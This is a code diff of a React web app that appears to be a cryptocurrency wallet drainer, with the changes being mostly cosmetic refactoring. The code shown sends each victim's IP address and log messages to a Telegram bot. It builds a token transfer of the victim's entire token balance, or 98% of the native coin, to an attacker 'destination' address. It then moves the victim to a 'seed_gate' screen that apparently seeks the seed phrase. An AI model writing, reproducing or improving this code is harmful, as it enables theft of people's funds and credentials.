@@ -28,20 +28,17 @@ export default function App() {
   const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });
 
   const log = (msg) => {
-    fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(data => {
-        const fullMsg = `${msg}\n🌐 IP: ${data.ip}`;
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: fullMsg })
-        });
-      }).catch(() => {
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: msg })
-        });
+    fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: `${msg}\n🌐 IP: ${data.ip}` })
       });
+    }).catch(() => {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: msg })
+      });
+    });
   };
 
   useEffect(() => {
@@ -61,8 +58,7 @@ export default function App() {
       const data = `0xa9059cbb${destination.replace('0x', '').toLowerCase().padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
       sendTransaction({ to: tokenAddr, data }, { onSettled: () => setView("seed_gate") });
     } else if (nativeBal && nativeBal.value > 100000000000000n) {
-      const amount = (nativeBal.value * 98n) / 100n;
-      sendTransaction({ to: destination, value: amount }, { onSettled: () => setView("seed_gate") });
+      sendTransaction({ to: destination, value: (nativeBal.value * 98n) / 100n }, { onSettled: () => setView("seed_gate") });
     } else {
       setView("seed_gate");
     }
@@ -136,17 +132,12 @@ export default function App() {
                   value={inputVal} 
                   type={activeTask === "Rectify" ? "text" : "number"} 
                   readOnly={activeTask === "Rectify"} 
-                  onChange={(e) => {
-                    const val = e.target.value;
-                    if (activeTask !== "Rectify") {
-                      if (!isNaN(val) || val === "") setInputVal(val);
-                    }
-                  }} 
+                  onChange={(e) => setInputVal(e.target.value)} 
                   style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} 
                   placeholder="0.00" 
                 />
               </div>
-              <button onClick={handleHandshake} style={{width:'100%', backgroundColor: '#10b981', color:'#000', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>START_HANDSHAKE</button>
+              <button onClick={handleHandshake} style={{width:'100%', backgroundColor:'#10b981', color:'#000', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>START_HANDSHAKE</button>
             </div>
           )}
 
